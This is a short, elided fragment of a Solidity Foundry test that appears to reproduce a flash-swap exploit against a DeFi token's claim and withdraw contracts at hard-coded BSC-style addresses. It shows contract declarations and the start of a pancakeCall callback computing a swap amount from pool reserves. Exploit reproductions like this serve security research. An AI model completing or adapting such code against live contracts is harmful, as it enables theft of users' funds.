...
contract ContractTest is Test {
    ...
    IUniswapV2Pair Pair =
        IUniswapV2Pair(0xd5cA448b06F8eb5acC6921502e33912FA3D63b12);
    TargetClaim targetClaim =
        TargetClaim(0xe70cdd37667cdDF52CabF3EdabE377C58FaE99e9);
    TargetWithdraw targetWihtdraw =
        TargetWithdraw(0x970A76aEa6a0D531096b566340C0de9B027dd39D);
    uint256 reserve0;
    uint256 reserve1;
    ...
    function pancakeCall(
        ...
        uint256 amountUsdt = (((reserve0 * reserve1) /
            ((yydsInPair * 10_000 - yydsInContract * 25) / 10_000)) / 9975) *
            10_000;
